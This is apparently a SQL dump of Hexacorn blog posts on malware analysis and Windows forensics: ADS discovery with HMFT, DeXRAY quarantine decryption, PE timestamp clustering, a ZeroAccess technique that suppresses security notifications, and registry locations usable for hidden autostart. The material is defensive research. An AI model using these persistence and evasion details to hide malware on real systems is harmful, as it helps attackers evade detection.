nKERNEL32.dll\nMessageBoxA\nwvsprintfA\nwsprintfW\nDefWindowProcA\nDispatchMessageA\nTranslateMessage\nGetMessageA\nRegisterDeviceNotificationA\nCreateWindowExA\nRegisterClassExA\nUSER32.dll\nCryptGetHashParam\nCryptDestroyHash\nCryptHashData\nCryptReleaseContext\nCryptCreateHash\nCryptAcquireContextA\nAdjustTokenPrivileges\nLookupPrivilegeValueA\nOpenProcessToken\nRegCloseKey\nRegSetValueExW\nRegCreateKeyExW\nRegNotifyChangeKeyValue\nRegSetValueExA\nRegOpenKeyExA\nADVAPI32.dll\nCoCreateInstance\nCoInitialize\nole32.dll\nw,a\njp5\nIOCTL_STORAGE_QUERY_PROPERTY\nShare this :)', 'Malware Analysis', 'http://www.hexacorn.com/blog/2012/10/09/skype-worm-strings/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (339, 'Permanent Link to Finding Alternate Data Streams (ADS) with HMFT', 'Hexacorn', 'October 4, 2012 ', 'Finding Alternate Data Streams  (ADS) on the whole drive may be quite time consuming so in this quick post I will show you how to do it faster with HMFT.\nAs you probably know, the latest version of HMFT supports listing of basic attributes directly from $MFT – from both images and live systems. Amongst the features it currently supports is showing type of attribute and its name. Turns out, that this is enough information to find out what named DATA streams are hidden inside the FILE records – and this is essentially what ADSs are.\nSo…\nFirst, let’s test how HMFT shows ADS-related data:\n\nFirst let’s create a few sample ADSs\n\necho > f:\\test\r\necho > f:\\test:ads\r\necho > f:\\test:ads2\r\necho > f:\\test:ads3\n\nNext, we run hmft over the drive and saving it to a file\n\nhmft -l f: f_mft.txt\n\nFinally, let’s see the content of the file – scroll down to see file name, first unnamed DATA attribute that is then followed by 3 named DATA attributes – ADS names:\n\n  [FILE]\r\n    SignatureD                    = 1162627398\r\n    OffsetToFixupArrayW           = 48\r\n    NumberOfEntriesInFixupArrayW  = 3\r\n    LogFileSequenceNumberQ        = 4204637\r\n    SequenceValueW                = 1\r\n    LinkCountW                    = 1\r\n    OffsetToFirstAttributeW       = 56\r\n    FlagsW                        = 1\r\n    UsedSizeOfMFTEntryD           = 448\r\n    AllocatedSizeOfMFTEntryD      = 1024\r\n    FileReferenceToBaseRecordQ    = 0\r\n    NextAttributeIdD              = 6\r\n   --\r\n\r\n    RESIDENT ATTRIBUTE\r\n      AttributeTypeIdentifierD = 16\r\n      LengthOfAttributeD       = 96\r\n      NonResidentFlagB         = 0\r\n      LengthOfNameB            = 0\r\n      OffsetToNameW            = 0\r\n      FlagsW                   = 0\r\n      AttributeIdentifierW     = 0\r\n      --\r\n      SizeOfContentD          = 72\r\n      OffsetToContentW        = 24\r\n      --\r\n        MFTA_STANDARD_INFORMATION\r\n            CreationTimeQ         = 129938289425003390\r\n            ModificationTimeQ     = 129938289502223390\r\n            MFTModificationTimeQ  = 129938289502223390\r\n            AccessTimeQ           = 129938289425003390\r\n            FlagsD                = 32\r\n            MaxNumOfVersionsD     = 0\r\n            VersionNumberD        = 0\r\n            ClassIdD              = 0\r\n            OwnerIdD              = 0\r\n            SecurityIdD           = 261\r\n            QuotaQ                = 0\r\n            USNQ                  = 0\r\n            CreationTime (epoch)    = 1349355342\r\n            ModificationTime (epoch)  = 1349355350\r\n            MFTModificationTime (epoch)  = 1349355350\r\n            AccessTime (epoch)           = 1349355342\r\n   --\r\n\r\n    RESIDENT ATTRIBUTE\r\n      AttributeTypeIdentifierD = 48\r\n      LengthOfAttributeD       = 104\r\n      NonResidentFlagB         = 0\r\n      LengthOfNameB            = 0\r\n      OffsetToNameW            = 0\r\n      FlagsW                   = 0\r\n      AttributeIdentifierW     = 2\r\n      --\r\n      SizeOfContentD          = 74\r\n      OffsetToContentW        = 24\r\n      --\r\n        MFTA_FILE_NAME\r\n            ParentID6             = 5\r\n            ParentUseIndexW       = 5\r\n            CreationTimeQ         = 129938289425003390\r\n            ModificationTimeQ     = 129938289425003390\r\n            MFTModificationTimeQ  = 129938289425003390\r\n            AccessTimeQ           = 129938289425003390\r\n            CreationTime (epoch)    = 1349355342\r\n            ModificationTime (epoch)  = 1349355342\r\n            MFTModificationTime (epoch)  = 1349355342\r\n            AccessTime (epoch)           = 1349355342\r\n            AllocatedSizeQ        = 0\r\n            RealSizeQ             = 0\r\n            FlagsD                = 32\r\n            ReparseValueD         = 0\r\n            LengthOfNameB         = 4\r\n            NameSpaceB            = 3\r\n     FileName = test\r\n   --\r\n\r\n    RESIDENT ATTRIBUTE\r\n      AttributeTypeIdentifierD = 128\r\n      LengthOfAttributeD       = 40\r\n      NonResidentFlagB         = 0\r\n      LengthOfNameB            = 0\r\n      OffsetToNameW            = 24\r\n      FlagsW                   = 0\r\n      AttributeIdentifierW     = 1\r\n      --\r\n      SizeOfContentD          = 13\r\n      OffsetToContentW        = 24\r\n      --\r\n        MFTA_DATA\r\n   --\r\n\r\n    RESIDENT ATTRIBUTE\r\n      AttributeTypeIdentifierD = 128\r\n      LengthOfAttributeD       = 48\r\n      NonResidentFlagB         = 0\r\n      LengthOfNameB            = 3\r\n      OffsetToNameW            = 24\r\n      FlagsW                   = 0\r\n      AttributeIdentifierW     = 3\r\n      --\r\n      SizeOfContentD          = 13\r\n      OffsetToContentW        = 32\r\n      --\r\n        MFTA_DATA\r\n    AttributeName = ads\r\n   --\r\n\r\n    RESIDENT ATTRIBUTE\r\n      AttributeTypeIdentifierD = 128\r\n      LengthOfAttributeD       = 48\r\n      NonResidentFlagB         = 0\r\n      LengthOfNameB            = 4\r\n      OffsetToNameW            = 24\r\n      FlagsW                   = 0\r\n      AttributeIdentifierW     = 4\r\n      --\r\n      SizeOfContentD          = 13\r\n      OffsetToContentW        = 32\r\n      --\r\n        MFTA_DATA\r\n    AttributeName = ads2\r\n   --\r\n\r\n    RESIDENT ATTRIBUTE\r\n      AttributeTypeIdentifierD = 128\r\n      LengthOfAttributeD       = 48\r\n      NonResidentFlagB         = 0\r\n      LengthOfNameB            = 4\r\n      OffsetToNameW            = 24\r\n      FlagsW                   = 0\r\n      AttributeIdentifierW     = 5\r\n      --\r\n      SizeOfContentD          = 13\r\n      OffsetToContentW        = 32\r\n      --\r\n        MFTA_DATA\r\n    AttributeName = ads3\n \n\nKnowing all this, we can quickly put together a perl script that can walk through the data and pick up all ADS from the output file:\n\nuse strict;\r\nmy $f=\'\';\r\nmy $l=\'\';\r\nwhile (<>)\r\n{\r\n  s/[\\r\\n]+//g;\r\n  $f = $1 if /FileName = (.+)$/;\r\n  print \"$f:$1\\n\" if ($l =~ /MFTA_DATA/&&/AttributeName = (.+)$/);\r\n  $l = $_;\r\n}\n\nSave it as ads.pl\nRun it using the following syntax\n\nperl ads.pl <hmft output>\ne.g.:\nperl ads.pl f_mft.txt\nThe output for the example file system is:\n$Repair:$Config\r\ntest:ads\r\ntest:ads2\r\ntest:ads3\n\nI suggest you running a test on your local drives  – you are probably going to be quite surprised \nNot only you may find plenty of files with ADS, but you may also get to know less-known good ADSs – many of them I have listed previously and a few more e.g. internal ADSs used by OS:\n\n$Info in $UpCase:$Info\n$Config in $Repair:$Config\n$Max in $UsnJrnl:$Max\n\nand also MAC-related streams (resource forks) added by Safari  (kinda equivalents of IE’s Zone.Identifier)\n\ncom.apple.quarantine\ncom.apple.metadata:kMDItemWhereFroms\n\nNote on a small bug here: with a larger number of ADSs the ads.pl script will show incorrect entries as ADS attributes that don’t fit within one FILE record will be stored elsewhere and w/o FILENAME attribute, hence the associated file name will be incorrect. Some may be also stored under ATTRIBUTE_LIST that is not supported by HMFT yet.\nShare this :)', 'Compromise Detection, Forensic Analysis, HMFT, Malware Analysis, Tips & Tricks', 'http://www.hexacorn.com/blog/2012/10/04/finding-alternate-data-streams-ads-with-hmft/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (340, 'Permanent Link to HexDive 0.5 – Adding a bit of a context…', 'Hexacorn', 'October 2, 2012 ', 'It’s time for a new version of HexDive!\nToday’s changes introduce many new keywords and some new features + bug fixes:\nKeywords:\n\nDelphi package/library/unit names (I posted some subset of this list previously)\nCompiler-related strings (not that really useful for malware analysis, but may help to identify the compiler-specific strings)\nCopyright banners (I posted some previously)\nRegistry key/value names (also posted some previously)\nMore information stealing-related strings (some more software targeted by infostealers, including some old ones e.g. The Bat, ICQ, AOL, etc.)\nGame-related strings (to highlight malware targeting various computer games)\nA lot new generic malware strings (from the top of the histogram of all strings extracted from 1M+ samples); many of these strings are not categorized yet, but still – better to have them being picked up than wait for a classification to be complete  – use -a option to see what ‘juicy’ stuff is being picked up\n\nNew features:\n\nThe output produced by -a option now includes physical offsets and may include context (see next point)\nI added a new experimental feature that shows context of the strings – basically, some bytes before and after the string in a file; this should help to quickly assess what’s the potential usefulness of the string and its context; it may also help to find other strings that are not picked up by HexDive for various reasons and that are stored inside the file within a close proximity of a found string. To see context, use a new command line options ‘-c’. See example below to see how it works in practice and how to use it to quickly locate strings of interest in a hex viewer.\n\nBug fixes:\n\nsometimes some strings were not picked up due to a bug in the processing algorithm; this affected strings that were using mixed lower/uppercase; should be fixed now; note: this bugfix introduces a side-effect that makes the output a bit noisier (e.g. New, NEW, NeW are being picked up; I may introduce some filtering of the output if it becomes an issue)\nsometimes some strings were printed twice – should be fixed now\nstrings were not picked up  at the end of the file – should be fixed now\n\nYou can download current version of HexDive here.\nIf your .exe download is blocked, you can try a zip file.\nExample of strings with a context\n\nWhen ran with -c option, HexDive shows a string with a context:\n\nAt the moment, it shows a string in one row, then in a next row the actual context of the string and finally 10 hexadecimal values\n\nthat you can copy and paste into a Search/Find in your favorite Hex Viewer\n\nto quickly locate the string of interest and it’s context without worrying about Unicode/ANSI/non-printable values:\n\nShare this :)', 'HexDive, Malware Analysis, Software Releases', 'http://www.hexacorn.com/blog/2012/10/02/hexdive-0-5-adding-a-bit-of-a-context/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (341, 'Permanent Link to HMFT update: listing $MFT attributes', 'Hexacorn', 'September 29, 2012 ', 'A few months back I released the first version of HMFT – a small utility written in x86 assembly that reads $MFT directly from a physical disk (or raw image file/DD format) and saves it to a file. Today I am releasing a new version of this tool that now can also extract $MFT metadata and print it out to the output file. It is very similar to AnalyzeMFT from David Kovar, mft.pl (wfa3e.zip) from Harlan Carvey, and fls from Sleuthkit as well as other similar utilities.\nThe main difference is that it is very small, fast, works on both live systems and images, and tries to parse the attributes and print out raw data in a way that includes all gore details from $MFT FILE records to help in analysis and  learning the NTFS internals.\nApart from a new functionality, I also fixed one bug – the actual $MFT FILE record was not saved to the output file in a previous version; this is now fixed.\n\nAs usual:\n\nit’s a work in progress and at the moment it only supports FILE_NAME and STANDARD_INFORMATION attributes as well as data LCNs. Hopefully I will be able to add other information later on.\nit may contain bugs so if you spot any, please do let me know and I will try to fix them.\nany feedback is much appreciated, thanks!\n\nDownload a new version here.\nEnjoy!\nThe new version now takes 3 arguments from a command line:\nUsage:\r\n   hmft [drive:] [-/options] [output filename]\r\n      where options are:\r\n      - l - enumerate $MFT and list FILE record attributes (partially implemented)\r\n      - d - dump $MFT to a file\r\n\r\nExamples:\r\n   hmft -d c: c_mft.dat\r\n   hmft -l c: c_mft_listing.dat\nExample session on a 1.2GiB $MFT:\n\nExample output:\n[NTFS BOOT RECORD]\r\n  BytesPerSector = 512\r\n  SectorsPerCluster = 8\r\n  MFTStartCluster = 786432\r\n  ----------------------------------------------\r\n  [FILE]\r\n    SignatureD                    = 1162627398\r\n    OffsetToFixupArrayW           = 48\r\n    NumberOfEntriesInFixupArrayW  = 3\r\n    LogFileSequenceNumberQ        = 99422051935\r\n    SequenceValueW                = 1\r\n    LinkCountW                    = 1\r\n    OffsetToFirstAttributeW       = 56\r\n    FlagsW                        = 1\r\n    UsedSizeOfMFTEntryD           = 616\r\n    AllocatedSizeOfMFTEntryD      = 1024\r\n    FileReferenceToBaseRecordQ    = 0\r\n    NextAttributeIdD              = 7\r\n   --\r\n\r\n    RESIDENT ATTRIBUTE\r\n      AttributeTypeIdentifierD = 16\r\n      LengthOfAttributeD       = 96\r\n      NonResidentFlagB         = 0\r\n      LengthOfNameB            = 0\r\n      OffsetToNameW            = 24\r\n      FlagsW                   = 0\r\n      AttributeIdentifierW     = 0\r\n      --\r\n      SizeOfContentD          = 72\r\n      OffsetToContentW        = 24\r\n      --\r\n        MFTA_STANDARD_INFORMATION\r\n            CreationTimeQ         = 128880037529117193\r\n            ModificationTimeQ     = 128880037529117193\r\n            MFTModificationTimeQ  = 128880037529117193\r\n            AccessTimeQ           = 128880037529117193\r\n            FlagsD                = 6\r\n            MaxNumOfVersionsD     = 0\r\n            VersionNumberD        = 0\r\n            ClassIdD              = 0\r\n            OwnerIdD              = 0\r\n            SecurityIdD           = 256\r\n            QuotaQ                = 0\r\n            USNQ                  = 0\r\n            CreationTime (epoch)    = 1243530152\r\n            ModificationTime (epoch)  = 1243530152\r\n            MFTModificationTime (epoch)  = 1243530152\r\n            AccessTime (epoch)           = 1243530152\r\n   --\r\n\r\n    RESIDENT ATTRIBUTE\r\n      AttributeTypeIdentifierD = 48\r\n      LengthOfAttributeD       = 104\r\n      NonResidentFlagB         = 0\r\n      LengthOfNameB            = 0\r\n      OffsetToNameW            = 24\r\n      FlagsW                   = 0\r\n      AttributeIdentifierW     = 3\r\n      --\r\n      SizeOfContentD          = 74\r\n      OffsetToContentW        = 24\r\n      --\r\n        MFTA_FILE_NAME\r\n            ParentID6             = 5\r\n            ParentUseIndexW       = 5\r\n            CreationTimeQ         = 128880037529117193\r\n            ModificationTimeQ     = 128880037529117193\r\n            MFTModificationTimeQ  = 128880037529117193\r\n            AccessTimeQ           = 128880037529117193\r\n            CreationTime (epoch)    = 1243530152\r\n            ModificationTime (epoch)  = 1243530152\r\n            MFTModificationTime (epoch)  = 1243530152\r\n            AccessTime (epoch)           = 1243530152\r\n            AllocatedSizeQ        = 1051983872\r\n            RealSizeQ             = 1051983872\r\n            FlagsD                = 6\r\n            ReparseValueD         = 0\r\n            LengthOfNameB         = 4\r\n            NameSpaceB            = 3\r\n     FileName = $MFT\r\n   --\r\n\r\n    NON_RESIDENT ATTRIBUTE\r\n      AttributeTypeIdentifierD = 128\r\n      LengthOfAttributeD       = 80\r\n      NonResidentFlagB         = 1\r\n      LengthOfNameB            = 0\r\n      OffsetToNameW            = 64\r\n      FlagsW                   = 0\r\n      AttributeIdentifierW     = 1\r\n      --\r\n      StartingVCNQ          = 0\r\n      EndingVCNQ            = 293647\r\n      OfsToRunListW         = 64\r\n      CompressionUnitSizeW  = 0\r\n      UnusedD               = 0\r\n      AllocateSizeQ         = 1202782208\r\n      ActualSizeQ           = 1202782208\r\n      InitializedSizeQ      = 1202782208\r\n      --\r\n        MFTA_DATA\r\n              len = 2\r\n              ofs = 3\r\n              LCN_Ofs = 786432\r\n              LCN_Len = 17312\r\n              len = 3\r\n              ofs = 4\r\n              LCN_Ofs = 16909768\r\n              LCN_Len = 276336\r\n              len = 0\r\n              ofs = 0\r\n   --\r\n\r\n    NON_RESIDENT ATTRIBUTE\r\n      AttributeTypeIdentifierD = 176\r\n      LengthOfAttributeD       = 272\r\n      NonResidentFlagB         = 1\r\n      LengthOfNameB            = 0\r\n      OffsetToNameW            = 64\r\n      FlagsW                   = 0\r\n      AttributeIdentifierW     = 6\r\n      --\r\n      StartingVCNQ          = 0\r\n      EndingVCNQ            = 36\r\n      OfsToRunListW         = 64\r\n      CompressionUnitSizeW  = 0\r\n      UnusedD               = 0\r\n      AllocateSizeQ         = 151552\r\n      ActualSizeQ           = 148896\r\n      InitializedSizeQ      = 148896\r\n      --\r\n        MFTA_BITMAP\r\n  NumOfClustersBlocks = 2\r\n  ----------------------------------------------\nDownload a new version here.\nShare this :)', 'Compromise Detection, Forensic Analysis, HMFT, Malware Analysis, Software Releases', 'http://www.hexacorn.com/blog/2012/09/29/hmft-update-listing-mft-attributes/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (342, 'Permanent Link to DeXRAY – Decrypting VBN files, Part 2', 'Hexacorn', 'September 21, 2012 ', 'A few months back I posted about DeXRAY –  a generic script/file carver that tries to decrypt various Quarantine files + PE files hidden inside other files under a simple layer of a single-byte xor encryption.\nSome time later, in one of my other posts I mentioned that newer VBN files used by Symantec Quarantine use a different encryption scheme; instead of using well-known xor with a 0x5A key, they now use 0xA5 key.\nTurns out that I was right about it, but only partially as there is a twist to it – not only these files are encrypted, but they are also divided into chunks separated by a 5 byte ‘chunk divider’ in a form of 0xF6 0x?? 0x?? 0xFF 0xFF. So, to reconstruct the encrypted Quarantine files, one needs to decrypt them with 0xA5 first and then remove the chunk dividers.\nSimple, isn’t?\nI updated DeXRAY.pl to handle this (quick & dirty patch, but it should work). If you find some VBN files that don’t get decrypted at all or get corrupted after decryption, please let me know.\nI bet Symantec guys added this to prevent accidental detection of Quarantine files by theirs and other AV companies’ scanners; the way I think it goes is that many AV companies use X-rays technique during scans (that is, they may find malware even if it is encrypted with a single byte xor) and they could potentially/accidentally decrypt and detect the Quarantine file during scans. That could potentially lead to some ‘funny’ results (recursive detection, etc.); introducing ‘chunk divider’ breaks the file format of the encrypted file and AV scans no longer can ‘understand’ the corrupted file structure (especially if it is an encrypted PE file).\nDownload a new version from here:  DeXRAY.pl\n \nShare this :)', 'Batch Analysis, Compromise Detection, DeXRAY, File Formats ZOO, Forensic Analysis, Incident Response', 'http://www.hexacorn.com/blog/2012/09/21/dexray-decrypting-vbn-files-part-2/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (343, 'Permanent Link to ZeroAccess death match with Shell_NotifyIconW', 'Hexacorn', 'September 18, 2012 ', 'There is a lot of ZeroAccess analysis all over the place, so not sure if anyone documented it before, but oh well…  here it goes…\nI have been recently looking at a new sample of ZeroAccess and spotted that at an early stage of the infection, it injects a small code into Windows Explorer:\n\nThe snippet is then executed via Asynchronous Procedure Call (NtQueueApcThread). Just looking at the size of the payload and the strings made me curious enough so I decided to have a quick look at the code.\nTurns out, this little snippet doesn’t like Shell_NotifyIconW API very much and it patches it in a very clever and selective way.\nThe disassembled code of the main routine from the snippet looks like this:\n\nThe PatchShell_NotifyIconW function shown on the screenshot is responsible for allocating a small buffer in memory (via ZwAllocateVirtualMemory) that will hold a code of the function modifying the standard behavior of Shell_NotifyIconW API.\nAs per MSDN, the Shell_NotifyIconW function takes 2 arguments:\nBOOL Shell_NotifyIcon(\r\n  _In_  DWORD dwMessage,\r\n  _In_  PNOTIFYICONDATA lpdata\r\n);\nThe new function installed by ZeroAccess looks like this:\n\nThe 33333333h is an address (patched at run-time) to the old unpatched version of the function, so that once ZeroAccess modifies the function’s behavior it can pass the control back to the original function.\nAs you can see, the patch is simple – it only modifies a dwMessage value so that it is always equal to NIM_DELETE, which pretty much means that any attempts to add/modify/change status of an icon on the notification area (tray) will fail.\nWhile I have not tested it as I don’t have any image with all these security settings on, it seems to be a simple trick to prevent the ‘annoying’  security notifications from happening while the malware is doing its evil thing. This is indirectly confirmed by the way the actual patch occurs. Instead of patching the entry code of Shell_NotifyIconW in a typical, process-global detour-like fashion, the malware walks through all DLLs loaded into Windows Explorer and finds addresses of Shell_NotifyIconW function only within the Import Address Tables  of two DLLs: ActionCenter.dll and wscntfy.dll. These hold the code responsible for the system/tray icon area notifications related to current security state of the system.\nQuite frankly, I like this piece of code as it is very neatly written (it even self-removes itself from memory after it is executed) but more importantly, these popups are actually quite annoying! \n \nShare this :)', 'Anti-Forensics, Malware Analysis', 'http://www.hexacorn.com/blog/2012/09/18/zeroaccess-death-match-with-shell_notifyiconw/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (344, 'Permanent Link to Beyond good ol’ Run key, Part 2', 'Hexacorn', 'September 16, 2012 ', 'In my previous post I described various less-known autoruns mechanisms that can be utilized by malware. This post follows-up on some of the ideas I have described there and lists another batch of applications providing features that could be potentially used by malware authors. This is not to scaremonger users of these applications –  the features described here are actually very useful and needed, and certainly developed in the best interest of the users. Still, they are potential avenues for developing hidden autostart so with ‘the better evil known than unknown’ in mind, here it goes:\nWinrar archiver\nAllows to define external viewer:\n\nThe value is stored under the following registry location:\n\nHKEY_CURRENT_USER\\Software\\WinRAR\\Viewer\\ExternalViewer\n\nThe other user-defined value worth remembering of is the AV scanner integration;\n\nstored in the registry under the following path:\n\nHKEY_CURRENT_USER\\Software\\WinRAR\\VirusScan\\Name\n\n WinZip Archiver\nWinZip allows for creating Self-extracting archives, the task can be accomplished with a help of an externally defined application:\n\nThe value is stored under:\n\nHKEY_CURRENT_USER\\Software\\Nico Mak Computing\\WinZip\\programs\\zip2exe\n\nOther interesting values:\n\nHKEY_CURRENT_USER\\Software\\Nico Mak Computing\\WinZip\\programs\\viewer\nHKEY_CURRENT_USER\\Software\\Nico Mak Computing\\WinZip\\programs\\vviewer\n\nWinzip in version 10 and earlier allowed for an antivirus scan same way as WinRar. This feature has been removed from newer versions as explained in this article. The users of old WinZip 10 could define the path to various external programs including antivirus, executable for creating Self-extracting .exes, viewer, as well as 3 external applications to handle old 16-bit archivers ARJ, LHZ and ARC.\n\nThe user-defined values could be found in Registry:\n\nHKEY_CURRENT_USER\\Software\\Nico Mak Computing\\WinZip\\programs\\arc\nHKEY_CURRENT_USER\\Software\\Nico Mak Computing\\WinZip\\programs\\arj\nHKEY_CURRENT_USER\\Software\\Nico Mak Computing\\WinZip\\programs\\lha\nHKEY_CURRENT_USER\\Software\\Nico Mak Computing\\WinZip\\programs\\scan\nHKEY_CURRENT_USER\\Software\\Nico Mak Computing\\WinZip\\programs\\viewer\nHKEY_CURRENT_USER\\Software\\Nico Mak Computing\\WinZip\\programs\\zip2exe\n\n\nInternet Download Manager\nDownloading files from the internet is certainly not a safe operation and IDM allows to define what application will be executed and act an external AV scanner upon a file download:\n\nThe actual value is stored here:\n\nHKEY_CURRENT_USER\\Software\\DownloadManager\\VScannerProgram\n\n\nDownload Accelerator Plus (DAP)\nThe very same functionality is present in DAP:\n\nand the value is stored here:\n\nHKEY_CURRENT_USER\\Software\\SpeedBit\\Download Accelerator\\AntiVirusEXE\n\n\n Orbit Downloader\nAnother popular downloader also offers the antivirus scan functionality:\n\nThis time the user-defined value is stored not in Registry, but in a configuration file:\n\n%USERPROFILE%\\Application Data\\Orbit\\conf.dat\n\ne.g.\nc:\\Documents and Settings\\user\\Application Data\\Orbit\\conf.dat\n\n Windows Live Messenger\nInstant Messenger applications also allow for defining applications that will be executed upon arrival of a file from the other users of IM. Such setting is present in WLM as well:\n\nThe actual value is stored under MSNMessnger branch:\n\nHKEY_CURRENT_USER\\Software\\Microsoft\\MSNMessenger\\AntiVirus\n\n\nThe value is stored as a binary and in this case data is just an UnicodeZ string\n\nMiranda\nAnother popular IM that offers antivirus scan is Miranda:\n\nthe value is stored in a file in the following location:\n\n%USERPROFILE%\\Application Data\\Miranda\\PROFILEFOLDER\\PROFILEFILENAME.dat\n\ne.g.\nc:\\Documents and Settings\\user\\Application Data\\Miranda\\foo\\foo.dat\n\nIt took around 2 hours to download all these applications, test them and write this blog entry. Not a thorough and very advanced research as you can see, but this is what it takes to find new stuff. If you have some spare time and like (or want to learn how) to write a new RegRipper plugin, perhaps now it’s a good time to give it a go  Thanks for reading!\n \nShare this :)', 'Anti-Forensics, Autostart (Persistence), Compromise Detection, Forensic Analysis, Malware Analysis', 'http://www.hexacorn.com/blog/2012/09/16/beyond-good-ol-run-key-part-2/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (345, 'Permanent Link to PESectionExtractor – Extracting PE sections and their strings', 'Hexacorn', 'September 2, 2012 ', 'In my old post I mentioned that one way to extract sections from Portable Executabls is to use 7zip. This, of course is not an elegant solution, so I wrote a script to do it in a more generic way.\nThe script attached to this post allows to:\n\nextract PE sections to separate files\n\n\n\nextract strings from all sections providing a context for each string\n\n\n\nextract strings from all sections providing a context for each string, but in a bit smarter way i.e. excluding strings from sections named .rsrc/.reloc as they often contain a lot of strings that are just random data (e.g. from bitmaps or bytes by chance appearing to look like a ‘meaningful’ sequence of characters)\n\nNotably, the string extraction excludes the appended data – this is a good news if you run the script over e.g. installers.  Installers, as explained in my older post, are very often setup.exe (stub) files with appended data that is compressed/encrypted and doesn’t provide any value to analysts unless decompressed/decrypted.\nIf the script fails to work, it is most likely a result of a packer/protector that makes some of the PE structures corrupted on purpose (e.g. using values outside reasonable boundaries that are still accepted by the Windows PE loader). The practical value of analysing sections/strings extracted from protected/packed/corrupted files is usually low, so I don’t add any checks in the scripts to detect such cases. Many of these techniques are discussed by Ange and he also offers practical examples – files that he crafted manually to test certain properties of PE files, so if you want to know more about this subject and perhaps improve the script his web site will give you all the info you need.\nBtw. if you like python, you can easily toy around with Ero Carrera’s pefile module and re-create the script with the same/better functionality.\nYou can download PESectionExtractor.pl script here.\nShare this :)', 'Malware Analysis, PESectionExtractor, Software Releases', 'http://www.hexacorn.com/blog/2012/09/02/pesectionextractor-extracting-pe-sections-and-their-strings/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (346, 'Permanent Link to Perfect Timestomping a.k.a. Finding suspicious PE files with clustering', 'Hexacorn', 'September 1, 2012 ', 'In my previous post about clustering, I mentioned that it can be used as an efficient  data reduction technique. I also provided some examples of timestamps that could be useful for detecting suspicious files on the system. One of them was a compilation time  embedded inside Portable Executables (PE). Turns out that putting this idea into practice is easy and today I wrote a simple perl script that implements this functionality in a few dozen lines of code.\nThe script scans directory (recursively, if requested) and finds all Portable Executables. It then reads their compilation timestamps and groups them into clusters. Each cluster is a ‘bucket’ holding all binaries compiled within a window of 1 day (86400 seconds). You can play around with the script and change the value of CLUSTER_BOUNDARY to e.g. 30 days and see what happens.\nOn a screenshot below you can see the script at work – finding all PE files and grouping them into clusters:\n\nAnd after processing the whole folder, the resulting clusters are printed out:\n\nOne needs to quickly scroll through these groups and look at isolated / oprhaned files or small groups and this should hopefully help in finding the bad apples. You can also toy around with the script over clean directories to see what intel you can gather from the compilation timestamps of all PE files inside some specific directory.\nFor example, after running it over the c:\\window\\system32 directory of various Windows flavors you may spot some interesting patterns:\n\nPortable Executables that are part of Windows OS are not build in an alphabetic order (I originally hoped they are – it could be an interesting pattern to use to spot ‘out-of-orderly’ named executables sandwiched between 2 clean OS files)\nStill, many OS binaries are compiled sequentially (with a few minutes difference) so many can be easily ignored in analysis\nOn Windows XP and Vista DLLs and EXEs seem to be compiled separately (this is an interesting pattern as  seeing .exe in a sequence of  .dlls should be immediately treated as suspicious; note that system updates may affect this pattern)\n On Windows 7 both EXEs and DLLs seem to be compiled w/o any specific pattern \nClean installation has a very small number of clusters within system32 directory; updated/patched binaries make analysis harder (still, updates will be most likely seen as separate clusters)\nFiles dropped by installers, malware, as well as packed executables, compiled scripts e.g. perl32exe, etc. should stand out, even if timestomped – see how psexec service executable stands out below\n\n\nCompilation time is a very useful characteristic of Portable Executable. Malware authors occasionally zero it or change it to a random value, but this is still not a very common practice. This, of course is a very good news for investigators and forensic analysts. If timestamp is real (not tampered  with), compilation time of a malicious sample is so unique that it is most likely different from ‘typical’ timestamps that can be found e.g. within system32 directory. As mentioned earlier, PECluester should be able to group such randomly dropped files into separate cluster(s) even if the file system (e.g. $MFT) timestamps are timestomped.\nSpeaking of the devil. I mentioned ‘perfect timestomping’ in the title of this post.\nWhy?\nPerfect timestomping of a Portable Executable would require not only changing the metadata on the file system, but also changing PE file’s compilation time (and all timestamps inside PE file that could reveal its compilation time) to some carefully chosen value that blends with compilation times of system files (especially for malware dropped inside system folders; for malware within application/temp data folders this – of course – is not that useful).\nSo, how would we go about finding such perfectly timestomped files?\nGood news for forensic investigators is that a compilation timestamp is only one of many possible timestamps that can be found inside a typical Portable Executable. Unless malware author takes a really good care of all these timestamps (either understands Portable Executable file format quite well or uses a specialized tool), there is a high chance one may find some inconsistencies. While not many PE timestamps are properly updated during compilation time (e.g. Resources, Import Table have placeholders for timestamps, but are often zeroed by the compiler), some may include timestamps e.g. Debug Directory as show on a screenshot below:\n\nOther clues about the compilation time can be related to\n\nembedded files (author might have forgotten to clean up their timestamps)\ncopyright banners for statically linked libraries\nstandard ‘template’ program icon (e.g. icons for win32 applications created via templates in RAD environment utilize always the same standard icon unless authors changes that; icons change between RAD versions and may give some clues as for the ‘age’ of the malware)\nlibraries/compiler signatures – this is difficult as it requires libraries of known patterns, IDA Pro’s FLIRT signatures come to mind here and may give some hints, but associating these with a specific date is close to impossible\neven harder – specific to the compiler version code of exception handlers, prologue/epilogue code, compilation flags etc.\n\nBack to PECluester – imho you can use it as an alternative to AV scans and a toy for further research. Go ahead and experiment. Enjoy!\nYou can download script here.\nShare this :)', 'Anti-Forensics, Compromise Detection, Forensic Analysis, Malware Analysis, PECluester, Software Rele', 'http://www.hexacorn.com/blog/2012/09/01/perfect-timestomping-a-k-a-finding-suspicious-pe-files-with-clustering/\n');
